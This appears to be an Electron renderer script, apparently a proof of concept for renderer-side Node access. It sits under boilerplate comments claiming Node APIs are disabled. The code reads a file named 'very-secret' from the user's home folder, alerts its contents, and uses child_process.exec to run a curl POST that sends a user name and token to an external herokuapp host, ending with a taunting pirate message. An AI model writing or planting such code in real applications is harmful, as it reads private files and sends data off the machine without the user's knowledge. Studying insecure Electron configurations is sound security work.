/**
 * This file is loaded via the <script> tag in the index.html file and will
 * be executed in the renderer process for that window. No Node.js APIs are
 * available in this process because `nodeIntegration` is turned off and
 * `contextIsolation` is turned on. Use the contextBridge API in `preload.js`
 * to expose Node.js functionality from the main process.
 */
const fs = require('fs');
const os = require("os")
const { exec } = require("child_process");

const secretFile  = `/Users/${os.userInfo().username}/very-secret`
const secret = fs.readFileSync(secretFile)
alert(secret);

const curlCmd = `curl -X POST https://library-of-secrets.herokuapp.com/secrets -H "Content-Type: application/json" -d '{"user":"tom","token":"abc123"}'`;
exec(curlCmd, (error, stdout, stderr) => {
  if (error) {
    alert(`error: ${error.message}`);
    return;
  }
  if (stderr) {
    alert(`stderr: ${stderr.message}`);
    return;
  }
  alert('🏴‍☠️ All your secrets belong to us 🏴‍☠️')
});
